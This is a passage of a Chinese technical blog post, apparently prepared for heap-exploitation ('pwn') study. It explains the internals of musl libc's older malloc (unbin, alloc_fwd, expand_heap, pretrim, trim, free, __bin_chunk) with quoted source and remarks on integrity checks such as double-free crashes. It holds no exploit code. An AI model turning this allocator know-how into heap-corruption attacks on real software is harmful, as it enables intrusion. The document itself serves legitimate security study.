class="keyword">define</span> PREV_CHUNK(c) ((struct chunk *)((char *)(c) - CHUNK_PSIZE(c)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_CHUNK(c) ((struct chunk *)((char *)(c) + CHUNK_SIZE(c)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_TO_CHUNK(p) (struct chunk *)((char *)(p) - OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_TO_MEM(c) (void *)((char *)(c) + OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIN_TO_CHUNK(i) (MEM_TO_CHUNK(&amp;mal.bins[i].head))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_INUSE  ((size_t)1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br></pre></td></tr></table></figure></div>

<h4 id="unbin"><a href="#unbin" class="headerlink" title="unbin"></a>unbin</h4><p>将 <code>chunk</code> 从 <code>bins</code> 中取出，并更新 <code>binmap</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span> &lt;&lt; i));</span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>当满足 <code>c-&gt;prev != c-&gt;next</code> 时可以不将 <code>mal.binmap</code> 清空。</strong></p>
<h4 id="alloc-fwd-alloc-rev"><a href="#alloc-fwd-alloc-rev" class="headerlink" title="alloc_fwd &amp; alloc_rev"></a>alloc_fwd &amp; alloc_rev</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_fwd</span><span class="params">(<span class="keyword">struct</span> chunk *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">size_t</span> k;</span><br><span class="line">    <span class="keyword">while</span> (!((k = c-&gt;csize) &amp; C_INUSE)) &#123;</span><br><span class="line">        i = bin_index(k);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;csize == k) &#123;</span><br><span class="line">            unbin(c, i);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_rev</span><span class="params">(<span class="keyword">struct</span> chunk *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">size_t</span> k;</span><br><span class="line">    <span class="keyword">while</span> (!((k = c-&gt;psize) &amp; C_INUSE)) &#123;</span><br><span class="line">        i = bin_index(k);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;psize == k) &#123;</span><br><span class="line">            unbin(PREV_CHUNK(c), i);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>alloc_fwd</code> 通过当前 <code>chunk</code> 的 <code>csize</code> 检查当前 <code>chunk</code> 是否空闲，如果空闲调用 <code>unbin</code> 函数将当前 <code>chunk</code> 从 <code>bins</code> 链表中取出。<br><code>alloc_rev</code> 通过当前 <code>chunk</code> 的 <code>psize</code> 检查当前 <code>chunk</code> 的前一个 <code>chunk</code> 是否空闲，如果空闲调用 <code>unbin</code> 函数将当前 <code>chunk</code> 的前一个 <code>chunk</code> 从 <code>bins</code> 链表中取出。</p>
<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>首先调用 <code>adjust_size</code> 检查申请内存大小是否合理并将申请的内存大小转换为 <code>chunk</code> 大小，具体转换规则为加 0x10 然后关于 0x20 向上对齐。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">adjust_size</span><span class="params">(<span class="type">size_t</span> *n)</span> &#123;</span><br><span class="line">    <span class="comment">/* Result of pointer difference must fit in ptrdiff_t. */</span></span><br><span class="line">    <span class="keyword">if</span> (*n - <span class="number">1</span> &gt; PTRDIFF_MAX - SIZE_ALIGN - PAGE_SIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*n) &#123;</span><br><span class="line">            errno = ENOMEM;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            *n = SIZE_ALIGN;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *n = (*n + OVERHEAD + SIZE_ALIGN - <span class="number">1</span>) &amp; SIZE_MASK;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>chunk</code> 大小超过 <code>MMAP_THRESHOLD</code>（即 0x38000 ）则直接 mmap 分配 <code>chunk</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">    <span class="type">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">    <span class="type">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ | PROT_WRITE,</span><br><span class="line">                        MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (base == (<span class="type">void</span> *) <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    c = (<span class="type">void</span> *) (base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">    c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">    c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">    <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>mmap 得到的 <code>chunk</code> 结构如下，注意该 <code>chunk</code> 的 <code>psize</code> 和 <code>csize</code> 的 <code>C_INUSE</code> 标志位均没有置位且没有下一个 <code>chunk</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/f134734a87c51eecae27ecd8677ae569.png"
                     
                ><br>如果大小不超过 <code>MMAP_THRESHOLD</code> 则先通过 <code>bin_index_up</code> 函数计算 <code>chunk</code> 大小对应的 <code>bin</code> 数组下标 <code>i</code> 。然后通过 <code>mal.binmap</code> 获取下标大于等于 <code>i</code> 的非空 <code>bin</code> 。接下来是两种情况，如果没有则调用 <code>expand_heap</code> 函数扩展堆然后调用 <code>alloc_rev</code> 将新扩展的堆块和前面空闲的堆块合并然后跳出循环，否则调用 <code>first_set</code> 函数获取大于等于 <code>i</code> 的最小下标，然后利用 <code>pretrim</code> 或 <code>unbin</code> 将 <code>chunk</code> 从 <code>bin</code> 链表中取出，最终也会跳出循环。这两种情况最终都会调用 <code>trim</code> 函数，这个函数的作用是从 <code>c</code> 上切下一块 <code>chunk</code> 用于内存分配，剩下的释放掉。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/3b02b82fc7fffa0ecbd53acd0c921c92.png"
                     
                ></p>
<h3 id="expand-heap"><a href="#expand-heap" class="headerlink" title="expand_heap"></a>expand_heap</h3><p>首先将需要扩展的大小 <code>n</code> 加上 <code>SIZE_ALIGN</code>（0x20），之后调用 <code>__expand_heap</code> 扩展堆并返回扩展后的内存的起始地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The argument n already accounts for the caller&#x27;s chunk</span></span><br><span class="line"><span class="comment"> * overhead needs, but if the heap can&#x27;t be extended in-place,</span></span><br><span class="line"><span class="comment"> * we need room for an extra zero-sized sentinel chunk. */</span></span><br><span class="line">n += SIZE_ALIGN;</span><br><span class="line"></span><br><span class="line">lock(heap_lock);</span><br><span class="line"></span><br><span class="line">p = __expand_heap(&amp;n);</span><br><span class="line"><span class="keyword">if</span> (!p) &#123;</span><br><span class="line">    unlock(heap_lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果新扩展的内存的起始地址不等于上一段扩展的内存的结束地址说明内存扩展不连续或者是第一次获取内存，需要在新扩展的 <code>chunk</code> 前面设置一个 <code>sentinel chunk</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If not just expanding existing space, we need to make a</span></span><br><span class="line"><span class="comment"> * new sentinel chunk below the allocated space. */</span></span><br><span class="line"><span class="keyword">if</span> (p != end) &#123;</span><br><span class="line">    <span class="comment">/* Valid/safe because of the prologue increment. */</span></span><br><span class="line">    n -= SIZE_ALIGN;</span><br><span class="line">    p = (<span class="type">char</span> *) p + SIZE_ALIGN;</span><br><span class="line">    w = MEM_TO_CHUNK(p);</span><br><span class="line">    w-&gt;psize = <span class="number">0</span> | C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后设置新扩展的 <code>chunk</code> 和下一个 <code>chunk</code> 的头部信息。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Record new heap end and fill in footer. */</span></span><br><span class="line">end = (<span class="type">char</span> *) p + n;</span><br><span class="line">w = MEM_TO_CHUNK(end);</span><br><span class="line">w-&gt;psize = n | C_INUSE;</span><br><span class="line">w-&gt;csize = <span class="number">0</span> | C_INUSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill in header, which may be new or may be replacing a</span></span><br><span class="line"><span class="comment"> * zero-size sentinel header at the old end-of-heap. */</span></span><br><span class="line">w = MEM_TO_CHUNK(p);</span><br><span class="line">w-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">unlock(heap_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> w;</span><br></pre></td></tr></table></figure></div>

<p>这里假设连续调用两次 <code>expand_heap</code>，则内存分布如下。由此可知道前面 <code>n += SIZE_ALIGN;</code> 是为了确保如果是不连续或第一次扩展堆时有可以有空间提供 <code>sentinel chunk</code> 和下一个 <code>chunk</code> 的头部。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/566d09f0c1b0a63232b6fa94494a346c.png"
                     
                ></p>
<h3 id="expand-heap-1"><a href="#expand-heap-1" class="headerlink" title="__expand_heap"></a>__expand_heap</h3><p>首先检验扩展的大小 <code>n</code> 是否合理，之后将 <code>n</code> 关于页大小向上对齐。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt; SIZE_MAX / <span class="number">2</span> - PAGE_SIZE) &#123;</span><br><span class="line">    errno = ENOMEM;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">n += -n &amp; PAGE_SIZE - <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果 heap 段还没有初始化过则通过 <code>brk(0)</code> 系统调用获取 heap 段基址，并将 <code>brk</code> 关于页面大小向上对齐。 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!brk) &#123;</span><br><span class="line">    brk = __syscall(SYS_brk, <span class="number">0</span>);</span><br><span class="line">    brk += -brk &amp; PAGE_SIZE - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果满足 <code>brk</code> 调用条件且 <code>brk</code> 调用正常则直接返回得到的内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &lt; SIZE_MAX - brk &amp;&amp; !traverses_stack_p(brk, brk + n)</span><br><span class="line">    &amp;&amp; __syscall(SYS_brk, brk + n) == brk + n) &#123;</span><br><span class="line">    *pn = n;</span><br><span class="line">    brk += n;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *) (brk - n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>否则调用 mmap 扩展内存，扩展内存的大小为 <code>max(n, PAGE_SIZE &lt;&lt; mmap_step / 2)</code> 同时将 <code>mmap_step</code> 加 1 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> min = (<span class="type">size_t</span>) PAGE_SIZE &lt;&lt; mmap_step / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (n &lt; min) n = min;</span><br><span class="line"><span class="type">void</span> *area = __mmap(<span class="number">0</span>, n, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (area == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">*pn = n;</span><br><span class="line">mmap_step++;</span><br><span class="line"><span class="keyword">return</span> area;</span><br></pre></td></tr></table></figure></div>

<h3 id="pretrim"><a href="#pretrim" class="headerlink" title="pretrim"></a>pretrim</h3><p><code>pretrim</code> 函数的作用是如果申请的 <code>chunk</code> 中切下所需的部分剩余部分可以放到该 <code>chunk</code> 所在 <code>bins</code> 中则直接从该 <code>chunk</code> 中切下所需部分返回。如果满足上述条件，这样做可以减少一次 <code>unbin</code> 和 <code>pretrim</code> 从而提高程序效率。</p>
<p>首先这里特判了一些不需要 <code>pretrim</code> 的情况。总的来说就是 <code>chunk</code> 或切完剩下的 <code>chunk</code> 太小的时候不需要 <code>pretrim</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (j &lt; i + <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="keyword">if</span> (n1 - n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    n1 = CHUNK_SIZE(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后判断如果满足 <code>pretrim</code> 的条件就将 <code>self</code> 分裂为 <code>self</code> 和 <code>split</code>，<code>spit</code> 放到 <code>bins</code> 中原来 <code>self</code> 所在位置，然后把新的 <code>self</code> 返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bin_index(n1 - n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">next = NEXT_CHUNK(self);</span><br><span class="line">split = (<span class="type">void</span> *) ((<span class="type">char</span> *) self + n);</span><br><span class="line"></span><br><span class="line">split-&gt;prev = self-&gt;prev;</span><br><span class="line">split-&gt;next = self-&gt;next;</span><br><span class="line">split-&gt;prev-&gt;next = split;</span><br><span class="line">split-&gt;next-&gt;prev = split;</span><br><span class="line">split-&gt;psize = n | C_INUSE;</span><br><span class="line">split-&gt;csize = n1 - n;</span><br><span class="line">next-&gt;psize = n1 - n;</span><br><span class="line">self-&gt;csize = n | C_INUSE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h3><p>如果从申请的 <code>chunk</code> 切下所需 <code>chunk</code> 后剩余部分还能构成一个 <code>chunk</code> 就切下所需 <code>chunk</code> 并发剩余部分调用 <code>__bin_chunk</code> 函数释放。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">trim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="type">void</span> *) ((<span class="type">char</span> *) self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1 - n | C_INUSE;</span><br><span class="line">    next-&gt;psize = n1 - n | C_INUSE;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    __bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>首先特判传入指针为空的情况。之后判断如果 <code>csize</code> 的 <code>C_INUSE</code> 位为空则通过 <code>psize</code> 找到 mmap 的起始地址 <code>base</code> 和 mmap 的内存长度 <code>len</code> 。之后如果 <code>extra &amp; 1</code> 则终止程序，如果直接 double free 一块非 mmap 的内存就是这个结果。之后调用 <code>__munmap</code> 释放这块内存。如果不是 mmap 得到的 <code>chunk</code> 则调用 <code>__bin_chunk</code> 释放 <code>chunk</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unmap_chunk</span><span class="params">(<span class="keyword">struct</span> chunk *self)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> extra = self-&gt;psize;</span><br><span class="line">    <span class="type">char</span> *base = (<span class="type">char</span> *) self - extra;</span><br><span class="line">    <span class="type">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">    <span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    __munmap(base, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">        unmap_chunk(self);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        __bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="bin-chunk"><a href="#bin-chunk" class="headerlink" title="__bin_chunk"></a>__bin_chunk</h3><p>获取 <code>chunk</code> 的大小并初始化 <code>final_size</code> 和 <code>new_size</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final_size = new_size = CHUNK_SIZE(self); </span><br></pre></td></tr></table></figure></div>

<p>检测 <code>next-&gt;psize</code> 和 <code>self-&gt;csize</code> 是否相等。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line"><span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br></pre></td></tr></table></figure></div>

<p>将该 <code>chunk</code> 与前后的空闲 <code>chunk</code> 合并直至满足 <code>self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE</code> 条件，即该 <code>chunk</code> 前后都没有空闲 <code>chunk</code> 。<br>期间如果满足 <code>new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size</code> （其中 <code>RECLAIM </code> 为 0x28000）则 <code>reclaim</code> 置 1 ，之后会对释放的 <code>chunk</code> 包含的所有完整物理页调用 <code>madvise</code> 设置 <code>lazyfree</code> 标志，这样在内存紧缺的时候会回收这些物理页。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">        self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">        next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">        i = bin_index(final_size);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        lock(mal.free_lock);</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        unlock(mal.free_lock);</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">        self = PREV_CHUNK(self);</span><br><span class="line">        size = CHUNK_SIZE(self);</span><br><span class="line">        final_size += size;</span><br><span class="line">        <span class="keyword">if</span> (new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size)</span><br><span class="line">            reclaim = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">        size = CHUNK_SIZE(next);</span><br><span class="line">        final_size += size;</span><br><span class="line">        <span class="keyword">if</span> (new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size)</span><br><span class="line">            reclaim = <span class="number">1</span>;</span><br><span class="line">        next = NEXT_CHUNK(next);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后更新 <code>binmap</code> 以及 <code>chunk</code> 头部各个字段，然后将 <code>chunk</code> 从对应 <code>bins</code> 的 <code>tail</code> 加入到链表中。最后对于 <code>reclaim</code> 为 1 的情况做相应的处理。</p>
